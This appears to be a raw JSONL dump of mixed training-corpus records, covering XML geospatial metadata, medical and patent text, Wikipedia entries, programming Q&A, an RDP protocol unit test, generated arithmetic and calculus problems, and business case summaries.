</gmd:MD_DigitalTransferOptions>\n      </gmd:transferOptions>\n    </gmd:MD_Distribution>\n  </gmd:distributionInfo>\n  <gmd:dataQualityInfo>\n    <gmd:DQ_DataQuality>\n      <gmd:scope>\n        <gmd:DQ_Scope>\n          <gmd:level>\n            <gmd:MD_ScopeCode codeList=\"http://standards.iso.org/ittf/PubliclyAvailableStandards/ISO_19139_Schemas/resources/Codelist/ML_gmxCodelists.xml#MD_ScopeCode\" codeListValue=\"dataset\">\n                            dataset\n                        </gmd:MD_ScopeCode>\n          </gmd:level>\n        </gmd:DQ_Scope>\n      </gmd:scope>\n      <gmd:report>\n        <gmd:DQ_DomainConsistency xsi:type=\"gmd:DQ_DomainConsistency_Type\">\n          <gmd:result>\n            <gmd:DQ_ConformanceResult xsi:type=\"gmd:DQ_ConformanceResult_Type\">\n              <gmd:specification>\n                <gmd:CI_Citation>\n                  <gmd:date>\n                    <gmd:CI_Date>\n                      <gmd:date>\n                        <gco:Date/>\n                      </gmd:date>\n                      <gmd:dateType>\n                        <gmd:CI_DateTypeCode codeList=\"http://standards.iso.org/ittf/PubliclyAvailableStandards/ISO_19139_Schemas/resources/Codelist/ML_gmxCodelists.xml#CI_DateTypeCode\" codeListValue=\"creation\">\n                                                    creation\n                                                </gmd:CI_DateTypeCode>\n                      </gmd:dateType>\n                    </gmd:CI_Date>\n                  </gmd:date>\n                </gmd:CI_Citation>\n              </gmd:specification>\n              <gmd:explanation>\n                <gco:CharacterString>See the referenced\n                                    specification\n                                </gco:CharacterString>\n              </gmd:explanation>\n              <gmd:pass>\n                <gco:Boolean>true</gco:Boolean>\n              </gmd:pass>\n            </gmd:DQ_ConformanceResult>\n          </gmd:result>\n        </gmd:DQ_DomainConsistency>\n      </gmd:report>\n      <gmd:lineage>\n        <gmd:LI_Lineage>\n          <gmd:statement>\n            <gco:CharacterString/>\n          </gmd:statement>\n        </gmd:LI_Lineage>\n      </gmd:lineage>\n    </gmd:DQ_DataQuality>\n  </gmd:dataQualityInfo>\n</gmd:MD_Metadata>\n", "meta": {"pile_set_name": "Github"}}
{"text": "Direct medical costs of Class IV HIV care.\nOver an 18-month period (January 1987 to June 1988), Group Health Cooperative (GHC) examined the direct medical costs and service utilization of enrollees with Class IV HIV conditions. Data is presented on inpatient stays, outpatient visits by specialty, and outpatient pharmacy, laboratory, home health, and purchased-outside services. Results for enrollees with Class IV HIV disease are compared to those for a control sample of enrollees, age and sex matched with the HIV sample. The per member per month (PMPM) cost for the HIV sample was $1,761, approximately 33 times greater than the PMPM cost for the control sample. Group Health's annualized cost of $21,130 per case and diagnosis-to-death cost of $31,700-$42,300 per case are comparable to costs of Class IV care in other settings. Primary care costs were 11 times that of controls. Several specialty areas (e.g., infectious disease, pulmonary, oncology, and radiation therapy) were impacted to a greater extent.", "meta": {"pile_set_name": "PubMed Abstracts"}}
{"text": "And we have one more, because I love you.\n\nExperiment 07 was brought to life by artist Phill Berry. Attach this Mutant to almost anything else you control (yes, even your Lab Assistants! They\u2019ll forgive you later) and start wreaking havoc!", "meta": {"pile_set_name": "OpenWebText2"}}
{"text": "/*\n   This program is free software; you can redistribute it and/or modify\n   it under the terms of the GNU General Public License as published by\n   the Free Software Foundation; either version 2 of the License, or\n   (at your option) any later version.\n\n   This program is distributed in the hope that it will be useful,\n   but WITHOUT ANY WARRANTY; without even the implied warranty of\n   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n   GNU General Public License for more details.\n\n   You should have received a copy of the GNU General Public License\n   along with this program; if not, write to the Free Software\n   Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.\n\n   Product name: redemption, a FLOSS RDP proxy\n   Copyright (C) Wallix 2016\n   Author(s): Jennifer Inthavong\n\n   T.124 Generic Conference Control (GCC) Unit Test\n*/\n\n#include \"test_only/test_framework/redemption_unit_tests.hpp\"\n\n#include \"core/RDP/gcc/userdata/cs_mcs_msgchannel.hpp\"\n\n\nRED_AUTO_TEST_CASE(Test_gcc_user_data_cs_mcs_msgchannel)\n{\n    InStream stream(\n        \"\\x06\\xc0\"         // CS_MCS_MSGCHANNEL\n        \"\\x08\\x00\"         // 8 bytes user Data\n\n        \"\\x00\\x00\\x00\\x00\" // TS_UD_CS_MCS_MSGCHANNEL::flags\n        \"\"_av);\n    GCC::UserData::CSMCSMsgChannel cs_mcs_msgchannel;\n    cs_mcs_msgchannel.recv(stream);\n    RED_CHECK_EQUAL(CS_MCS_MSGCHANNEL, cs_mcs_msgchannel.userDataType);\n    RED_CHECK_EQUAL(8, cs_mcs_msgchannel.length);\n    RED_CHECK_EQUAL(0, cs_mcs_msgchannel.flags);\n\n    // cs_mcs_msgchannel.log(\"Client Received\");\n}\n", "meta": {"pile_set_name": "Github"}}
{"text": "Fujifilm X100F\n\nOne of the more expensive cameras on my list, the X100F is the best model yet of the popular series of fixed-lens cameras with APS-C-size sensors. It's got a wide-angle lens and a relatively compact design, and if you need a gift for a grad who likes physical manual controls -- and who you're willing to spend the bucks on -- this is a great choice.\n\nSony RX100 V\n\nThe Sony RX100 V makes my list now that its price has been reduced. If you want to gift the most feature-packed compact available today for someone who wants to carry a camera all the time, this is the one.\n\nPanasonic Lumix ZS100\n\nOne of my perennial general-purpose go-to recommendations, the ZS100 delivers the upgrade in image quality afforded by a one-inch sensor with enough of a zoom lens for a lot of framing flexibility, and it's sufficiently fast to capture life in action. Plus, it supports 4K video for the sharpest capture possible. And it's cheaper than the RX100 V. There's a newer model with a longer zoom lens, the ZS200, but it's more expensive and the lens has a more limited aperture range.\n\nSony A6000\n\nAny newbie downsizing from a dSLR or upgrading from a compact will find this a great interchangeable-lens model. With the image quality and performance of a dSLR, the A6000 is a few generations old, but that just means it's inexpensive enough to make an affordable yet terrific gift. If you can spend more, the latest successor A6500 is better, but it's also a budget-buster with a basic kit lens.\n\nPanasonic Lumix FZ1000\n\nThe FZ1000 is a good fit for people who want the look and feel of a dSLR, better image quality than a point-and-shoot, and a long zoom lens they don't need to worry about changing whether they're shooting landscapes, portraits, birds or sports.\n\nOlympus OM-D E-M10 Mark II\n\nA small dSLR alternative, one of the best things about the Micro Four Thirds interchangeable-lens cameras is that the lenses are tiny -- you can throw five in your bag and barely feel them. The E-M10 Mark II is fast, with solid photo quality and a useful feature set, plus Olympus' policy of adding features via firmware upgrades makes this one a long-term choice. The company recently rolled out the Mark III, but most of the changes were in the interface, so performance and photo quality should be identical if you want something newer.\n\nDJI Mavic Pro\n\nFor the outdoorsy type who wants to do drone photography but needs it to fit in a backpack, the foldable Mavic Pro is the most travel-friendly of the more advanced bunch. It's not a cheap gift but it will surely be appreciated.\n\nCanon EOS 80D\n\nYou can find this excellent general-purpose dSLR reasonably priced for the body, which makes it a nice gift for anyone who's done with their cheap dSLR and looking for faster focus and continuous shooting.\n\nGoPro Hero 6 Black\n\nIt may look like the Hero 5, but GoPro's Hero 6 Black update to the most popular action camera has a new processor that enables better image quality and stabilization, plus another level of slow-motion, which make it worth gifting the newest model.", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Cycling at the 2016 Summer Paralympics \u2013 Men's road time trial H5\n\nThe Men's time trial H5 road cycling event at the 2016 Summer Paralympics took place on 14 September at Flamengo Park, Pontal. Twelve riders from nine nations competed.\n\nThe H5 category is a handcycle class is for cyclists with lower limb disabilities, such as amputation, but more or less full trunk stability.\n\nResults : Men's road time trial H5\n\nReferences\n\nMen's road time trial H5", "meta": {"pile_set_name": "Wikipedia (en)"}}
{"text": "Q:\n\nCopy value of char array to 2D array\n\nAs you can see below i create a 2D array of strings. Also i use a char array named \"buffer\". I want to copy the value of buffer to the [5][0] position of the 2D array.\nThe problem is that when the value of buffer changes, the value of the cell of the array also changes.\nI want to keep the first value.\n#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n\nchar * strNameList[10][2] = { \n    {\"Luca\", \"Daniel\"} ,\n    {\"Vivan\", \"Desmond\"},\n    {\"Abdul\", \"Justin\"}, \n    {\"Nina\", \"Marlene\"},\n    {\"Donny\", \"Kathlene\"} \n};\n\nint main()\n{\n    int j, i;\n    int pos = 5;\n    char buffer[10204];\n\n    strcpy(buffer, \"A Value\");\n\n    strNameList[pos][0] = buffer;\n    strNameList[pos][1] = \"Surname\";\n    for (i = 0; i < 9; i++) {\n        printf(\"\\n\");\n        for (j = 0; j < 2; j++)\n            printf(\" %s\", strNameList[i][j]);\n    }\n\n    strcpy(buffer, \"B Value\");      \n    for (i = 0; i < 9; i++) {\n        printf(\"\\n\");\n        for (j = 0; j < 2; j++)\n            printf(\" %s\", strNameList[i][j]);\n    }\n}\n\nOutput: \n\n Luca Daniel\n Vivan Desmond\n Abdul Justin\n Nina Marlene\n Donny Kathlene\n A Value Surname\n\n Luca Daniel\n Vivan Desmond\n Abdul Justin\n Nina Marlene\n Donny Kathlene\n B Value Surname\n\nA:\n\nThe problem is that strNameList[pos][0] points to buffer and it's not an independant storage location, since it's simply a pointer you can modify it using either buffer or strNameList[pos][0] because both point to the same place in memory.\nDon't mix pointers to string literals, and pointers to non-const arrays in the same array of strings, instead use\nstrNameList[pos][0] = strdup(buffer);\n\nand you will see the difference, likewise\nstrNameList[pos][1] = strdup(\"Surname\");\n\nyou will need a\nfree(strNameList[pos][0]);\nfree(strNameList[pos][1]);\n\nlater, when you no longer need the pointers.\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "1. Field of the Invention\nThe present invention relates generally to active implantable medical devices (AIMDs), and more particularly, to stitched components of an AIMD.\n2. Related Art\nMedical devices having one or more active implantable components, generally referred to herein as active implantable medical devices (AIMDs), have provided a wide range of therapeutic benefits to patients over recent decades. AIMDs often include an implantable, hermetically sealed electronics module, and a device that interfaces with a patient's tissue, sometimes referred to as a tissue interface. The tissue interface may include, for example, one or more instruments, apparatus, sensors or other functional components that are permanently or temporarily implanted in a patient. The tissue interface is used to, for example, diagnose, monitor, and/or treat a disease or injury, or to modify a patient's anatomy or physiological process.\nIn particular applications, an AIMD tissue interface includes one or more conductive electrical contacts, referred to as electrodes, which deliver electrical stimulation signals to, or receive signals from, a patient's tissue. The electrodes are typically disposed in a biocompatible electrically non-conductive member, and are electrically connected to the electronics module. The electrodes and the non-conductive member are collectively referred to herein as an electrode assembly.", "meta": {"pile_set_name": "USPTO Backgrounds"}}
{"text": "Tapestry of Creation\n\nThe Tapestry of Creation or Girona Tapestry is a Romanesque panel of needlework  from the 11th century, housed in the Museum of the Cathedral of Girona, Catalonia, Spain. Measuring  3.65 x 4.70 m, it originally may have served as baldachin for the Altar of the Holy Cross in the church's entrance. Some believe that it was used as a curtain or even a carpet. It depicts a series of theological scenes related with the Christian creation myths.\n\nThe \"tapestry\" is actually a panel of couched needlework laid down on the surface of the ground fabric, a terracotta wool intertwined with  different colors (red, green, yellow, dark and light blue, gray) wool and white linen threads. The border is formed by a frame, rather deteriorated, containing small square pictures which, according to some scholars, could have been added later to the central sector, due to their different, Byzantine-like style and themes.\n\nThe tapestry, of which only the upper part remains, is divided into three cycles:\nthe Genesis, presided over by the Christ Pantocrator\nthe cosmic elements\nthe Stories of the Holy Cross\n\nThe Christ Pantocrator, depicted as a beardless young man, occupies a circle in the center of the tapestry. He is surrounded by a circle whose sectors, aside from the upper one with a dove, symbol of God, show the seven days of the creation, until the creation of Adam and Eve. The two circles include quotes from the Genesis.\n\nThe remaining space in the rectangle including the central disk, houses at the corner four representation of Winds, depicted by four young winged men in Roman-like dresses, driving vessels and blowing air into horns. The central upper square is an old man representing the Year, with the Wheel of Time, while at the upper corners are the personifications of the Rivers of Paradise. The other six upper squares depict the Four Seasons, as well as Samson and Abel (or Cain).\n\nThe two lower corners show the personifications of the Sun (left, symbolizing Sunday) and the Moon (right, much deteriorated, symbolizing Monday), while the  side outer squares represent the months (only eight of which survive). At the bottom are incomplete scenes of the discovery of Holy Cross.\n\nSources\n\nExternal links\n\nOfficial cathedral's website \nPage with details of the figures \nPage with links to websites and the newest literature  (2012) \nThe Art of medieval Spain, A.D. 500-1200, an exhibition catalog from The Metropolitan Museum of Art Libraries (fully available online as PDF), which contains material on Tapestry of Creation (no. 159) \n\nCategory:Romanesque art\nCategory:Embroidery\nCategory:11th-century works\nCategory:Cultural depictions of Adam and Eve\nCategory:Jesus in art", "meta": {"pile_set_name": "Wikipedia (en)"}}
{"text": "Q:\n\nXpath of element with some count\n\nI'm using webdrive java and testng.\nI need to find the xpath or some other locator for Users(80). 80 is count of users which chnages according to users count. From IDE, i got link=Users80, but as 80 changes, i think it's not a good idea to use it as locator in my code because next time if I execute program, the count may be 30 or 90, so the locator would be Users(90) and my program would fail.\nPlease help me find the locator:\n <div>\n<a href=\"/test2/test/public/admin/projects/project/index/project_id/1\">Dashboard</a>\n</div>\n </li>\n  <li id=\"items_\" class=\"active\">\n  <div>\n <a href=\"/test2/test/public/projects/project/visits/project_id/1\" style=\"background-color:         transparent;\">\n  Users\n   <span>80</span>\n     </a>\n\nA:\n\nThere are lot of ways to do that. Check out this for more details, \nFor given HTML, Try the following, \n driver.findElement(By.partialLinkText(\"Users\")).click();\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": ")?\n8\nLet k(x) = x**2 + 4*x - 1. Let c(b) = b**2 - 19*b - 47. Let q be c(21). What is k(q)?\n4\nLet n(z) = -12*z**2 + 4*z - 1. Let a(o) be the first derivative of 13*o**3/3 - 5*o**2/2 + 2*o - 6. Let g(j) = 2*a(j) + 3*n(j). Give g(-1).\n-11\nLet w(s) = 8*s + 14. Let r(n) = 3*n + 5. Let q(m) = -14*r(m) + 5*w(m). Suppose 5*y + 6*g = g + 110, -4*y + 123 = -3*g. Let z = 33 - y. Give q(z).\n-12\nLet v(x) = x**3 - x**2 - 2*x + 4. Let w = -9 + 25. Suppose 0 = -4*i + w - 4. Give v(i).\n16\nSuppose 22*r = 4*r - 90. Let v(q) = -q - 1. What is v(r)?\n4\nLet i(h) be the second derivative of -h**5/20 - h**4/6 - h**3/6 - 3*h**2/2 + 89*h. Suppose 2*g = -3*w - 19, -g = -4*w + 3*w + 2. What is i(w)?\n9\nSuppose -56*s + 49*s - 35 = 0. Let h(q) = -q**3 - 5*q**2 - q + 2. Determine h(s).\n7\nLet p = 45 + -9. Let o(a) = -a**2 - 6 + 24*a - p*a + 17*a. Give o(4).\n-2\nSuppose -2*d + 6*q - 3*q - 6 = 0, -q = -d - 2. Let l(g) be the second derivative of -g**3/6 + 15*g**2/2 - g - 38. What is l(d)?\n15\nLet l(n) = -n + 3. Let h be (1 + 2 + -1)*-1. Let v = 0 - h. Suppose 0*o - 6 = -v*o. What is l(o)?\n0\nLet p(y) = y**2 + 8*y + 6. Let o be p(-8). Let z(b) be the second derivative of b**5/20 - b**4/2 - b**3/6 + 3*b**2/2 - 21*b - 15. Calculate z(o).\n-3\nSuppose 2*k = 11 - 5. Let f(t) = -9*t**k + 5*t + 3*t**2 + 8*t**3 - 13 + 16. Give f(4).\n7\nLet r be ((-3)/(-12))/(1/4). Let t(q) = q + 1. Let o = -1 - 0. Let i(f) = -3*f - 4. Let n(m) = o*i(m) - 4*t(m). Determine n(r).\n-1\nLet a(n) = n - 2. Suppose 24 = 8*b - 0. Let x be (16/3 - b)*-3. Give a(x).\n-9\nLet f(r) be the first derivative of r**2/2 - 6*r + 315. Suppose 0 = c + 2*c. Calculate f(c).\n-6\nLet m be -4 + 2 + (-5)/(-1). Let u(f) = -f**3 - f**2 + 2*f**m - 1 - 3*f**3 - f. Let z(s) = s**3 - 9*s**2 + 16*s - 15. Let x be z(7). What is u(x)?\n1\nLet p(t) = t**3 - 5*t**2 + 8*t - 13. Let d be p(6). Suppose -3*n - 2*n - 3*s = -87, 0 = 5*n - s - d. Let w = n + -19. Let g(f) = -f**3 - 4*f**2. Give g(w).\n0\nLet w = -6084 - -6073. Let t(x) be the third derivative of x**4/24 + x**3 + x**2. What is t(w)?\n-5\nLet s(m) be the second derivative of -m**5/20 + 5*m**4/12 - 2*m**3/3 - 3*m**2/2 + 49*m - 1. What is s(5)?\n-23\nSuppose -5*n + 17 + 43 = 0. Suppose 3*l + 0*l = 3*m - n, -4*m = -3*l - 14. Let z(q) = q**2 + q + 2. Determine z(m).\n8\nLet u(c) = -c**2 - 5*c + 3. Let o = 82 + -69. Suppose -7*g + 36 = -o*g. Calculate u(g).\n-3\nLet t(b) = -5*b - 9. Let o(j) = -j - 1. Let s(a) = -6*o(a) + t(a). Calculate s(11).\n8\nSuppose 4*d - 2*i - 2*i - 240 = 0, -i + 105 = 2*d. Suppose -2*y - 15 + d = 0. Let t be (1/(-1))/(5/y). Let u(g) = -g**3 - 4*g**2 - 1. Determine u(t).\n-1\nLet t be ((-14)/(-6))/(-7)*(-3 + 12). Let w(q) = 2*q**3 + 5*q**2 + 3*q - 2. Let y(l) = -l**3 - 4*l**2 - 2*l + 1. Let r(f) = t*y(f) - 2*w(f). Determine r(3).\n-8\nLet b = -366 - -361. Let s(x) = -x**3 - 6*x**2 - 7*x - 7. Give s(b).\n3\nSuppose -7*i - 30 - 19 = 0. Let o(t) = -t**3 - 6*t**2 + 6*t + 2. What is o(i)?\n9\nLet z be (-36)/15 + 38/95. Let d(f) be the second derivative of -f**4/6 + f**3/2 + 3*f**2/2 - f. Determine d(z).\n-11\nLet q(p) be the third derivative of p**4/24 - 13*p**3/6 + p**2 + 6*p. Calculate q(9).\n-4\nLet g(f) be the third derivative of f**4/24 + 3*f**3/2 + 68*f**2 - 2*f. Determine g(-16).\n-7\nLet x(c) = c**3 + 3*c**2 - c - 2. Let l be x(-3). Let u(z) be the second derivative of 1/2*z**2 - 1/6*z**3 + 0 + 1/12*z**4 + 13*z. Give u(l).\n1\nSuppose -6 = -2*f + o, -4*f - 3*o + 0 = -2. Let a be (1 - 1)*2/(-4). Let w(r) = 1 - 4*r**f - r**3 - 4 + a*r + 5*r - 1. Determine w(-5).\n-4\nLet v(i) = 3*i - 2*i**2 + 5 + 3*i**2 + 3*i. Let p be (0 - (-30)/(-12) - 0)*2. Determine v(p).\n0\nLet i(w) = -w**3 - w**2 + w - 4. Let t = -15 - 37. Let p = t + 52. Give i(p).\n-4\nLet c(k) = 4*k**2. Let f = -36 - -42. Suppose -7*m = -m - f. Give c(m).\n4\nLet w(r) = -r**2 + 11*r - 16. Let k be w(9). Suppose -3*t - k*m = -4*m + 19, -5*t = -4*m + 35. Let g(d) = -d**2 - 4*d - 4. Determine g(t).\n-1\nLet r(w) = w**3 + 5*w**2 + 4*w - 3. Let k = -560 + 556. What is r(k)?\n-3\nLet u be (-1)/(((-1)/2)/1). Let f be 4 + (1 - (-2 + u)). Let n(y) be the third derivative of y**5/60 - 5*y**4/24 - y**3/3 + 2*y**2 - 415*y. What is n(f)?\n-2\nLet y(x) = 5*x**3 - 25*x**2 + 16*x + 11. Let r(l) = -l**3 + 6*l**2 - 4*l - 3. Let z(m) = -9*r(m) - 2*y(m). Suppose 0 = -v - 4. Calculate z(v).\n-11\nLet u(j) = -j**3 + 11*j**2 - 2*j + 24. Let f(k) = 5*k + 201. Let x be f(-38). Determine u(x).\n2\nLet z(u) be the third derivative of u**4/3 - u**3/3 - 138*u**2. Calculate z(-2).\n-18\nSuppose -2*c - 1 = 1. Let o(v) = -v**3 - 15*v**2 + 16*v + 8. Let b(j) = -j**2 + j + 1. Let y(d) = c*o(d) + 2*b(d). Give y(-14).\n-6\nLet n(b) be the second derivative of b**5/20 + 7*b**4/12 + 7*b**3/6 - 5*b**2/2 - b. Let v be ((-40)/(-6))/(2/3). Suppose v*m + 28 = -32. Determine n(m).\n-11\nLet a = -265 + 263. Let g(s) = 2*s**2 + s - 3. Calculate g(a).\n3\nLet i = -15 + 10. Let u(h) = -355*h + 721*h - h**3 + 3 - 361*h - 4*h**2. Give u(i).\n3\nLet o(j) be the second derivative of j**3/3 - 17*j**2/2 + 5*j. Let m be o(14). Let n(a) = 4*a + m - 5*a - 8. What is n(3)?\n0\nLet m(a) = a + 4. Let t(w) = w + 2. Suppose -6*z + z = 10. Let b(p) = z*m(p) + 5*t(p). What is b(-3)?\n-7\nLet l(t) = -t**2 + 6*t - 7. Let m be l(6). Let v = -1 - m. Let k(n) = -7*n**2 - n + 2 + v*n**2 + 2 + 0. Determine k(0).\n4\nLet q(i) = 10*i + 5. Let j be q(-5). Let d = 38 + j. Let t(y) = 5*y**3 - 7*y**2 + 3 - 6*y**3 - 5*y + 6*y. Calculate t(d).\n-4\nLet k(i) be the third derivative of -i**6/20 - i**5/60 - i**4/24 - i**3/6 + 57*i**2. Determine k(-1).\n5\nSuppose -2*y = 3*y - 20. Suppose -y*f = f. Let l(j) be the third derivative of j**4/24 - 18*j**2. Determine l(f).\n0\nLet i(v) = -2*v**2 - 3*v + 3. Suppose 5*t + 12 = -8, 5*b + 2*t - 17 = 0. Suppose -5*m = -h + 8 + 9, b*m + 11 = -2*h. What is i(h)?\n-11\nLet u(i) = i**3 - 4*i**2 - 8*i + 6. Suppose 20 = -64*n + 68*n. Suppose -3*p + 2*p = 4, b - n*p = 25. Give u(b).\n-9\nLet u(r) = 4*r**2 - 2*r + 2 - 1 + 0*r**2. Let l be 4/6 - ((-78)/9)/26. What is u(l)?\n3\nLet l(p) = p**3 + 4*p**2 - 5*p - 2. Let h = 36 + -34. Suppose 3*d = o - 18, 3*d + 3*o = -h*o. Calculate l(d).\n-2\nLet j be (-50 - -50) + (1 - -1). Let t(b) = -4*b + 1. What is t(j)?\n-7\nLet u(d) = -d**2 + 3*d + 5. Suppose 4*p + 2*f = 46, 4*p - 3*f - 3 = 2*p. Suppose 7*s - p = 33. What is u(s)?\n-13\nLet q(f) = f**2 + 44. Let d(p) = -2*p**2 - p - 110. Let i(w) = -2*d(w) - 5*q(w). Suppose b - 23 = -5*z, -z + b + 0*b + 1 = 0. What is i(z)?\n-8\nLet d(q) = q**2 - 3*q + 9. Let a = -1137 - -1143. Calculate d(a).\n27\nSuppose -5*k = -3*g - 64, -3*k - 2*g + 26 = -1. Let d(w) = -2*w + 13. Calculate d(k).\n-9\nLet l(t) = -t**3 + 6*t**2 - 3*t - 6. Let m be l(5). Let u(v) = -v**2 + 4*v. Let c(w) = -w**2 + 3*w + 1. Let s(b) = m*u(b) - 5*c(b). Give s(0).\n-5\nSuppose -2*k = -180 + 70. Let w = k + -59. Let f(x) = 3*x + 4. Determine f(w).\n-8\nLet p(t) = -67*t - 28 + 10 + 10. Let q(y) = 100*y + 11. Let w(n) = 7*p(n) + 5*q(n). Give w(1).\n30\nLet h(j) = 12*j - 124. Let g be h(11). Let i(l) = -l**2 + 8*l - 5. Calculate i(g).\n-5\nLet u(j) = 5*j - 2. Let f = 957 + -966. What is u(f)?\n-47\nSuppose -2*x - 4*z = 6, 3*x + z = 2*x. Let q(p) = -3*p**2 - 2*p - 6. Let r(u) = -3*u**2 - 3*u - 7. Let v(d) = -6*q(d) + 5*r(d). Determine v(x).\n19\nLet n(g) be the second derivative of g**5/20 + 5*g**4/12 + 2*g**3/3 + 7*g**2/2 - g. Let j(f) = f**2 - 2 - 4*f - 4*f + 4. Let p be j(7). Calculate n(p).\n-13\nLet n(q) = q**3 - 10*q**2 - 3*q - 2. Let f = 919 - 909. Give n(f).\n-32\nLet r(w) = -3*w + 4. Let b be (60/24)/(2/4). Let s(q) = 2*q - 1 + q**2 - b + 1. Let k be s(-4). Determine r(k).\n-5\nLet c(q) be the first derivative of 4*q**2 - 47*q + 75. Give c(7).\n9\nLet x be (-6)/(-1 - (2 - 1)). Let k(v) = -14*v**2 + 4. Let p(u) = 24*u**2 - u - 6. Let g(y) = 5*k(y) + 3*p(y). Calculate g(x).\n11\nSuppose -7*p + 5*p - 2*b + 22 = 0, -p = -b - 5. Let d(q) be the first derivative of -p*q + 3 + 1/2*q**2. Calculate d(5).\n-3\nLet x(c) be the second derivative of -c**5/20 + 7*c**4/12 - 4*c**3/3 + 4*c**2 + 9*c - 11. Calculate x(6).\n-4\nLet i(q) = 8*q + 32. Let j(x) = -7*x - 26. Let r(z) = 3*i(z) + 4*j(z). Calculate r(-11).\n36\nLet w(p) = -4*p - 4. Let z = -339 + 344. What is w(z)?\n-24\nLet o(x) = -13. Let k(l) = -l - 27. Let w(m) = 3*k(m) - 7*o(m). What is w(-14)?\n52\nSuppose -41*k - 64*k = -840. Let g(h) = -h**3 + 9*h**2 - 4*h + 9. Let s(z) =", "meta": {"pile_set_name": "DM Mathematics"}}
{"text": "The use of electronic devices for recording videos and taking pictures has increased significantly in recent years. Exemplary electronic devices for recording videos and taking pictures include smart phones and hand-held cameras. Such devices frequently include a viewfinder, which the user can use for previewing before taking a picture or recording a video.", "meta": {"pile_set_name": "USPTO Backgrounds"}}
{"text": "Publication Date:\n\nDiscipline:\n\nSource:\n\nProduct number:\n\nLength:\n\nAlso Available in:\n\ndescription\n\nIn October 2004 Fern\u00e1ndez Pujals, founder of Telepizza, an international home delivery pizza business, bought 24.9% of Jazztel (\u20ac90 million), a telecom company. At the time, Jazztel that was near bankruptcy and needed a capital injection to finish the year. Over the next ten years, Fern\u00e1ndez Pujals led the restructuring of Jazztel's debt, reached an agreement with the former monopoly Telef\u00f3nica, set up internal call centers, and transformed Jazztel into the fastest growing broadband operator in Spain. The case describes how Fern\u00e1ndez Pujals designed and managed the board and led Jazztel towards profitable growth.\n\nlearning objective:\n\nThe case provides an example of board dynamics and corporate governance of a Spanish telecom company with a controlling shareholder serving as Chairman of the Board of Directors.\n\nPublication Date:\n\nDiscipline:\n\nSource:\n\nProduct number:\n\nLength:\n\nAlso Available in:\n\ndescription\n\nOn Tuesday March 15, 2011, all 1,200 global Partners of McKinsey & Co. gathered at the Gaylord National Hotel & Convention Center near Washington, DC for their annual Partners' conference. The atmosphere was tense as Partners, in addition to their normal agenda, discussed the Galleon Group insider-trading trial and the recent allegations against the Firm's former Managing Director, Rajat Gupta. Three months earlier Senior Partner, Anil Kumar, pled guilty to providing confidential information about McKinsey clients he served to Galleon Group founder Raj Rajaratnam. The McKinsey Partners were shocked and dismayed by the actions of Kumar, as well as the recent allegations against Gupta and were closely monitoring the situation. Could a former Managing Director of their Firm have conspired to enable insider trading? And if so, what did that mean for the future of the Firm?\n\nPublication Date:\n\nDiscipline:\n\nSource:\n\nProduct number:\n\nLength:\n\nAlso Available in:\n\ndescription\n\nOn Tuesday March 15, 2011, all 1,200 global Partners of McKinsey & Co. gathered at the Gaylord National Hotel & Convention Center near Washington, DC for their annual Partners' conference. The atmosphere was tense as Partners, in addition to their normal agenda, discussed the Galleon Group insider-trading trial and the recent allegations against the Firm's former Managing Director, Rajat Gupta. Three months earlier Senior Partner, Anil Kumar, plead guilty to providing confidential information about McKinsey clients he served to Galleon Group founder Raj Rajaratnam. The McKinsey Partners were shocked and dismayed by the actions of Kumar, as well as the recent allegations against Gupta and were closely monitoring the situation. Could a former Managing Director of their Firm have conspired to enable insider trading? And if so, what did that mean for the future of the Firm?\n\nlearning objective:\n\nStudents will analyze how management at a leading consulting firm responded to insider-trading allegations against its former Managing Partner. The case examines how McKinsey communicated with its constituents about the matter and the actions it took to prevent poor behavior in the future.\n\nPublication Date:\n\nDiscipline:\n\nSource:\n\nProduct number:\n\nLength:\n\nAlso Available in:\n\ndescription\n\nThere have been significant, positive changes in boardroom practices over the past 25 years. However, there is still work to do, says the author, whose expertise in corporate governance matters was tapped for lawsuits involving the Tyco and Enron fiascos at the dawn of this new century. Drawing on decades of research and experience, the author outlines the major problems that boards have faced over the past quarter century and the solutions proposed to overcome them. He warns of the negative, unintended consequences of some of these solutions, many of which were not thought through carefully and may be based on false premises. Finally, he offers four recommendations for directors, CEOs, shareholders and other stakeholders on how to meet future governance challenges within the wider context of business. Put simply, there needs to be open communication between all parties and a consensus on the ultimate purpose of the firm.\n\nPublication Date:\n\nDiscipline:\n\nSource:\n\nProduct number:\n\nLength:\n\nAlso Available in:\n\ndescription\n\nSince the start of the 21st century, a new breed of shareholder--the activist hedge fund--has frequently played a decisive role in interactions between corporations and markets. The game of these activists is simple: They buy stocks they view as undervalued and pressure management to do things they believe will raise the value, such as giving more cash back to shareholders or shedding divisions that the activists think are driving down the stock price. With increasing frequency they get deeply involved in governance--demanding board seats, replacing CEOs, and advocating specific business strategies. The authors have identified six ways in which to fend off activist challenges or use them to improve your organization: (1) Have a clear strategic focus and stick to it. (2) Analyze your business as an activist would. (3) Have your external advisers lined up in advance and familiar with your company. (4) Build board chemistry. (5) Perform in the short run against declared goals. (6) Don't dismiss activist ideas out of hand.\n\nPublication Date:\n\nDiscipline:\n\nSource:\n\nProduct number:\n\nLength:\n\nAlso Available in:\n\ndescription\n\nIn December 1997 United Rentals (URI) went public on the NYSE. Ten years later, during the peak of the economic meltdown, the company's performance was in decline. United Rentals had experienced its share of problems in the prior years and was still struggling to emerge from this turmoil.\n\nIn the spring of 2008, the recession had decimated the company's core business, construction equipment rental. The economic downturn resulted in a significant decrease in North American construction and industrial activities and had adversely affected the company's revenues and operating result. The stock of the company quickly fell from the mid-$30 range in late 2007 to $3 in March 2009. In addition, two of the company's former chief financial officers had been charged with securities fraud and other violations, by both the U.S. Attorney's office and the SEC. The Board was faced with the resignation of the founder and chairman, management succession issues, the failed merger with Cerberus, and the lawsuit in Delaware. The Board was responsible for overseeing the change in a number of senior management and board positions which became increasingly difficult due to the turmoil and poor performance of the company. Recruiting and retaining talent in senior management and the board was central to the success of the company, which relied on their people for strong performance. In addition the company's total indebtedness was approximately $3.3 billion, including $146 million of subordinated convertible debenture. The company's substantial indebtedness had the potential to have adverse consequences in a number of ways, including: increase their vulnerability to adverse economic, industry or competitive developments; require the company to devote a substantial portion of their cash flow to debt service, reduce the funds available for other purposes; limit their ability to obtain additional financing; and decrease their profitability or cash flow. And the company was still dealing with multiple purported class action and derivative lawsuits 